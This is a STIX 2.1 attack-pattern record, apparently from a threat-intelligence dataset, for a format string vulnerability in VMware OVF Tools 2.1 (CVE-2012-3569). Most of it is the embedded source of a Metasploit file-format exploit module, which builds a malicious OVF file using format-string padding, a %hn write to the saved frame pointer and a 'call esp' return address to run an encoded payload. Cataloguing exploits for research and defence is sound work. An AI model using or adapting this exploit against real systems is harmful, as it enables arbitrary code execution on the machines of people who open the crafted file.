{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--487c84dd-9108-456c-a83c-38559b77d7fe",
    "created": "2024-08-14T16:35:49.091176Z",
    "modified": "2024-08-14T16:35:49.09118Z",
    "name": "VMWare OVF Tools Format String Vulnerability",
    "description": " This module exploits a format string vulnerability in VMWare OVF Tools 2.1 for Windows. The vulnerability occurs when printing error messages while parsing a a malformed OVF file. The module has been tested successfully with VMWare OVF Tools 2.1 on Windows XP SP3.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ovf_format_string.rb",
            "external_id": "ovf_format_string.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3569"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2012-0015.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VMWare OVF Tools Format String Vulnerability',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in VMWare OVF Tools 2.1 for\n        Windows. The vulnerability occurs when printing error messages while parsing a\n        a malformed OVF file. The module has been tested successfully with VMWare OVF Tools\n        2.1 on Windows XP SP3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jeremy Brown', # Vulnerability discovery\n          'juan vazquez'  # Metasploit Module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-3569' ],\n          [ 'OSVDB', '87117' ],\n          [ 'BID', '56468' ],\n          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2012-0015.html' ]\n        ],\n      'Payload'        =>\n        {\n          'DisableNops'    => true,\n          'BadChars'       =>\n            (0x00..0x08).to_a.pack(\"C*\") +\n            \"\\x0b\\x0c\\x0e\\x0f\" +\n            (0x10..0x1f).to_a.pack(\"C*\") +\n            (0x80..0xff).to_a.pack(\"C*\") +\n            \"\\x22\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x54\\x59\", # push esp # pop ecx\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n              'BufferOffset' => 6\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # vmware-ovftool-2.1.0-467744-win-i386.msi\n          [ 'VMWare OVF Tools 2.1 on Windows XP SP3',\n            {\n              'Ret' => 0x7852753d,  # call esp # MSVCR90.dll 9.00.30729.4148 installed with VMware OVF Tools 2.1\n              'AddrPops' => 98,\n              'StackPadding' => 38081,\n              'Alignment' => 4096\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-11-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.ovf']),\n      ])\n  end\n\n  def ovf\n    my_payload = rand_text_alpha(4) # ebp\n    my_payload << [target.ret].pack(\"V\") # eip # call esp\n    my_payload << payload.encoded\n\n    fs = rand_text_alpha(target['StackPadding']) # Padding until address aligned to 0x10000 (for example 0x120000)\n    fs << rand_text_alpha(target['Alignment']) # Align to 0x11000\n    fs << my_payload\n    # 65536 => 0x10000\n    # 27    => Error message prefix length\n    fs << rand_text_alpha(65536 - 27 - target['StackPadding'] - target['Alignment'] - my_payload.length - (target['AddrPops'] * 8))\n    fs << \"%08x\" * target['AddrPops'] # Reach saved EBP\n    fs << \"%hn\" # Overwrite LSW of saved EBP with 0x1000\n\n    ovf_file = <<-EOF\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Envelope vmw:buildId=\"build-162856\" xmlns=\"http://schemas.dmtf.org/ovf/envelope/1\"\nxmlns:cim=\"http://schemas.dmtf.org/wbem/wscim/1/common\"\nxmlns:ovf=\"http://schemas.dmtf.org/ovf/envelope/1\"\nxmlns:rasd=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData\"\nxmlns:vmw=\"https://www.vmware.com/schema/ovf\"\nxmlns:vssd=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData\"\nxmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n  <References>\n    <File ovf:href=\"Small VM-disk1.vmdk\" ovf:id=\"file1\" ovf:size=\"68096\" />\n  </References>\n  <DiskSection>\n    <Info>Virtual disk information</Info>\n    <Disk ovf:capacity=\"8\" ovf:capacityAllocationUnits=\"#{fs}\" ovf:diskId=\"vmdisk1\" ovf:fileRef=\"file1\" ovf:format=\"https://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized\" />\n  </DiskSection>\n  <VirtualSystem ovf:id=\"Small VM\">\n    <Info>A virtual machine</Info>\n  </VirtualSystem>\n</Envelope>\n    EOF\n    ovf_file\n  end\n\n  def exploit\n    print_status(\"Creating '#{datastore['FILENAME']}'. This files should be opened with VMMWare OVF 2.1\")\n    file_create(ovf)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-08",
    "x_mitre_platforms": [
        "win'"
    ]
}